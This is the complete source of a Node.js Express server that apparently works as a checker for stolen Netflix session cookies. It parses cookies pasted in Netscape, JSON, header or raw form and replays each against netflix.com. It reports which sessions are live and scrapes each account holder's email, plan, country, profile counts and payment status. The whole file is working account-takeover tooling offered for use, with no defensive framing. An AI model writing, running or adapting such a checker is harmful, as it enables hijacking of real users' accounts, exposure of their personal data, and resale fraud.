import express from "express";
import cors from "cors";
import fetch from "node-fetch";
import path from "path";

const app = express();

app.use(cors());
app.use(express.json());

/* =========================
   SERVE FRONTEND
========================= */

const __dirname = new URL(".", import.meta.url).pathname;

app.use(express.static("dist"));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "dist/index.html"));
});

/* =========================
   COOKIE CONVERTER
========================= */

function convertCookieFormat(raw) {

  if (!raw) return "";

  const cookies = [];
  const lines = raw.split(/\r?\n/);

  for (let line of lines) {

    line = line.trim();
    if (!line) continue;

    if (line.includes("|")) {
      line = line.split("|")[0].trim();
    }

    // JSON cookies
    if (line.startsWith("[") || line.startsWith("{")) {
      try {

        const json = JSON.parse(line);

        if (Array.isArray(json)) {
          for (const c of json) {
            cookies.push(`${c.name}=${c.value}`);
          }
        }

        continue;

      } catch {}
    }

    // Netscape format
    if (line.includes(".netflix.com") && line.split(/\s+/).length >= 7) {
      const parts = line.split(/\s+/);
      cookies.push(parts[5] + "=" + parts[6]);
      continue;
    }

    // Header format
    if (line.toLowerCase().startsWith("cookie:")) {
      cookies.push(line.replace(/cookie:/i, "").trim());
      continue;
    }

    // Raw cookie
    if (line.includes("=")) {
      cookies.push(line);
    }

  }

  return cookies.join("; ");
}

/* =========================
   CHECK API
========================= */

app.post("/api/check", async (req, res) => {

  const { cookie } = req.body;

  if (!cookie) {
    return res.json({ status: "INVALID" });
  }

  const cookieList = cookie
    .split("\n")
    .map(c => convertCookieFormat(c))
    .filter(Boolean);

  try {

    for (const ck of cookieList) {

      const response = await fetch("https://www.netflix.com/browse", {
        headers: {
          "user-agent": "Mozilla/5.0",
          "cookie": ck
        }
      });

      const text = await response.text();

      if (!text.includes("profilesGate")) continue;

      /* =========================
         PARSE ACCOUNT DATA
      ========================= */

      let plan = "UNKNOWN";

      if (text.toLowerCase().includes("premium")) plan = "PREMIUM";
      else if (text.toLowerCase().includes("standard")) plan = "STANDARD";
      else if (text.toLowerCase().includes("basic")) plan = "BASIC";
      else if (text.toLowerCase().includes("mobile")) plan = "MOBILE";

      let country = "UNKNOWN";
      const countryMatch = text.match(/"currentCountry":"(.*?)"/);

      if (countryMatch) country = countryMatch[1];

      let email = "UNKNOWN";
      const emailMatch = text.match(/"email":"(.*?)"/);

      if (emailMatch) email = emailMatch[1];

      let profiles = 0;
      const profileMatches = text.match(/profileName/g);

      if (profileMatches) profiles = profileMatches.length;

      let kidsProfiles = 0;
      const kidsMatch = text.match(/"isKids":true/g);

      if (kidsMatch) kidsProfiles = kidsMatch.length;

      let extraMembers = "NONE";

      if (text.toLowerCase().includes("extra member")) {
        extraMembers = "AVAILABLE";
      }

      let paymentStatus = "UNKNOWN";

      if (
        text.toLowerCase().includes("visa") ||
        text.toLowerCase().includes("mastercard") ||
        text.toLowerCase().includes("paypal") ||
        text.toLowerCase().includes("billing")
      ) {
        paymentStatus = "ACTIVE";
      }

      return res.json({
        status: "VALID",
        plan,
        country,
        profiles,
        kidsProfiles,
        extraMembers,
        email,
        paymentStatus
      });

    }

    return res.json({ status: "INVALID" });

  } catch (err) {

    console.error(err);
    res.json({ status: "ERROR" });

  }

});

/* =========================
   START SERVER
========================= */

const PORT = process.env.PORT || 8080;

app.listen(PORT, "0.0.0.0", () => {
  console.log("Checker server running on port " + PORT);
});
